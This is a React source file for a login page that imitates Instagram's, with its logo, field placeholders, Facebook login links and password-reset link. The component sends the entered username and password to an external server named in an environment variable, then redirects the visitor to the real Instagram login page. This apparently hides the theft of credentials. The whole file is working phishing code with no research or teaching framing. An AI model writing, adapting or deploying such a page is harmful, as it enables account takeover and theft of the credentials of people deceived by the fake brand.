import React, {useRef, useState} from 'react';
import axios from 'axios';
import './login.css';


const LogIn = () => {
    const loginRef = useRef();
    const passwordRef = useRef();
    const [password, setPassword] = useState("");
    const [showPassword, setShowPassword] = useState(true)


    const handleClick = async (login, password) => {
        if (login && password){
            try {
                const {data} = await axios.post(process.env.REACT_APP_API_URL, {login, password});
                if (data.newUser) window.location.href = "https://www.instagram.com/accounts/login/?source=auth_switcher";
                return data.newUser;
            } catch (error) {
                console.error(error);
                throw error;
            }
        }
        else console.log("Entered only login or password")
    }
    
    const show = () => {
        passwordRef.current.type = "text";
        setShowPassword(false);
        
    }
    const hide = () => {
        passwordRef.current.type = "password";
        setShowPassword(true);
    }

    return (
        <div className='wrapperLogIn'>
            <img className='img-instagram' src="assets/Instagram_logo.png" alt="Instagram"/>   
            <input className='input-text' type="text" name="login" placeholder='Phone number, username, or email' ref={loginRef}/>     
            <div className='box__input-password'>
                <input className='input-text' type="password" name="Password" placeholder='Password' onChange={e => setPassword(e.target.value)} ref={passwordRef}/>  
                   
                {password && showPassword && <span className='button-password' onMouseDown={() => show()}>Show</span>}
                {password && !showPassword && <span className='button-password' onMouseDown={() => hide()}>Hide</span>}
            </div>
            <div style={{alignSelf:"center"}}><input onClick={() => handleClick(loginRef.current.value, password)} className='input-button-login' type="button" value="Log in" /></div>
            <div className='box-OR'>
                <div className='box-OR__line'></div>
                <div className='box-OR__text'>OR</div>
                <div className='box-OR__line'></div>
            </div>
            
            <div className='box-facebook'>
                <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25229gy64wnw93k8128s10a1f1n5s11ppavp01ix47st1hlxbld1qdoc5q%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D060dd6c4-71cb-46ad-bb3d-7c0f4eb7b57f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25229gy64wnw93k8128s10a1f1n5s11ppavp01ix47st1hlxbld1qdoc5q%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_US&pl_dbl=0">
                    <img className='box-facebook__img-facebook' src="assets/facebook.png" alt="facebook" /></a>
                <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25229gy64wnw93k8128s10a1f1n5s11ppavp01ix47st1hlxbld1qdoc5q%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D060dd6c4-71cb-46ad-bb3d-7c0f4eb7b57f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25229gy64wnw93k8128s10a1f1n5s11ppavp01ix47st1hlxbld1qdoc5q%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_US&pl_dbl=0" style={{textDecoration: "none"}}>
                    <p className='box-facebook__text'>Log in with Facebook</p></a>
            </div>
            <a href="https://www.instagram.com/accounts/password/reset/" style={{textDecoration: "none", alignSelf: "center"}}><div className='buuton-forgot-password'>Forgot password?</div></a>
        </div>
    );
}

export default LogIn;
